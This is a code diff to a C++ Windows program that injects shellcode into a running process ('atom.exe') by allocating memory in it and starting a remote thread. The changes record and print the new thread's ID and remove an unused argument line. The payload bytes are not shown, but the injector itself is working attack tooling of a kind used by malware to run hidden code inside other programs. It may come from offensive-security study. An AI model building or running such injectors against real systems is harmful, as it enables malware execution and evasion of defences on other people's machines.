@@ -47,7 +47,9 @@ bool InjectShellcodeToRemoteProcess(HANDLE hProcess, const BYTE* pShellcode, SIZ
         VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
         return false;
     }
-    
+
+	DWORD threadId = 0;
+
     hThread = CreateRemoteThread(
         hProcess,
         nullptr,
@@ -55,7 +57,7 @@ bool InjectShellcodeToRemoteProcess(HANDLE hProcess, const BYTE* pShellcode, SIZ
         reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcodeAddress),
         nullptr,
         0,
-        nullptr
+        &threadId
     );
 
     if (hThread == nullptr) {
@@ -66,6 +68,8 @@ bool InjectShellcodeToRemoteProcess(HANDLE hProcess, const BYTE* pShellcode, SIZ
         return false;
     }
 
+	std::cout << "[+] Thread created with ID:" << threadId;
+    
     auto threadCloser = [](HANDLE h) { if (h) CloseHandle(h); };
     std::unique_ptr<void, decltype(threadCloser)> threadGuard(hThread, threadCloser);
 
@@ -101,7 +105,6 @@ int main(int argc, char* argv[]) {
 	LPCWSTR pname = L"atom.exe";
 	GetRemoteProcessHandle(pname, &pdwPid, &phProcess );
     
-    std::string dll = argv[1];
     InjectShellcodeToRemoteProcess(phProcess, &Payload, sizeof(Payload));
     std::cin.get();
 
